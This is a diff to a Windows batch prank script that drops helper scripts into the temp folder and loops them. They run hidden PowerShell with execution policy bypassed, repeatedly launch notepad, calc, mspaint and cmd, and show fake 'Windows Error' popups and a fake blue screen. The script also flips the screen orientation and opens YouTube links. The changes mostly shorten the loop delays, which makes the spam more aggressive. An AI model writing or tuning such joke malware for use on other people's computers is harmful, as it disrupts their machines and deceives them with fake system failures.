@@ -98,12 +98,14 @@ echo $timer.Start() >> %temp%\cursor_trail.ps1
 echo [System.Windows.Forms.Application]::Run($form) >> %temp%\cursor_trail.ps1
 :: Run the PowerShell script hidden
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %temp%\cursor_trail.ps1
+ping 127.0.0.1 -n 2 >nul
 goto loopdaddy
 
 :rest1
 start "" "https://www.youtube.com/watch?v=1OW5Yr_NaUY&list=RD1OW5Yr_NaUY&start_radio=1"
 start "" "https://www.youtube.com/watch?v=1OW5Yr_NaUY&list=RD1OW5Yr_NaUY&start_radio=1"
 start "" "https://www.youtube.com/watch?v=nebNhtYSlFw&list=RDEMF7GeOhMDXItb2tMUwT2zNQ&start_radio=1&rv=1OW5Yr_NaUY"
+pause
 
 
 
@@ -132,7 +134,7 @@ echo start notepad.exe
 echo start calc.exe
 echo start mspaint.exe
 echo start cmd.exe
-echo ping 127.0.0.1 -n 6 ^>nul
+echo ping 127.0.0.1 -n 3 ^>nul
 echo goto program_spam
 ) > %temp%\ps.bat
 
@@ -154,7 +156,7 @@ echo echo Set objShell = CreateObject^("WScript.Shell"^) ^> %%temp%%\popup.vbs
 echo echo objShell.Popup "%%msgs[!rand!]%%", 0, "Windows Error", 16 + 4096 ^>^> %%temp%%\popup.vbs
 echo cscript //nologo %%temp%%\popup.vbs
 echo del %%temp%%\popup.vbs
-echo ping 127.0.0.1 -n 4 ^>nul
+echo ping 127.0.0.1 -n 3 ^>nul
 echo goto popup_spam
 ) > %temp%\popup.bat
 
@@ -176,7 +178,7 @@ echo echo $label.TextAlign = 'MiddleCenter' ^>^> %%temp%%\fakebsod.ps1
 echo echo $form.Controls.Add^($label^) ^>^> %%temp%%\fakebsod.ps1
 echo echo $form.ShowDialog^(^) ^>^> %%temp%%\fakebsod.ps1
 echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %%temp%%\fakebsod.ps1
-echo ping 127.0.0.1 -n 15 ^>nul
+echo ping 127.0.0.1 -n 5 ^>nul
 echo goto fakebsod
 ) > %temp%\bsod.bat
 
@@ -231,7 +233,7 @@ echo   powershell -Command "$sig='[DllImport^(\"user32.dll\"^)]public static ext
 echo ^) else ^(
 echo   powershell -Command "$sig='[DllImport^(\"user32.dll\"^)]public static extern bool SetDisplayConfig^(uint n,IntPtr p,uint m,IntPtr i,uint f^);';Add-Type -M $sig -N u -Name c;[u.c]::SetDisplayConfig^(0,0,0,0,6^)"
 echo ^)
-echo ping 127.0.0.1 -n 16 ^>nul
+echo ping 127.0.0.1 -n 3 ^>nul
 echo goto screen_flip
 ) > %temp%\flip.bat
 
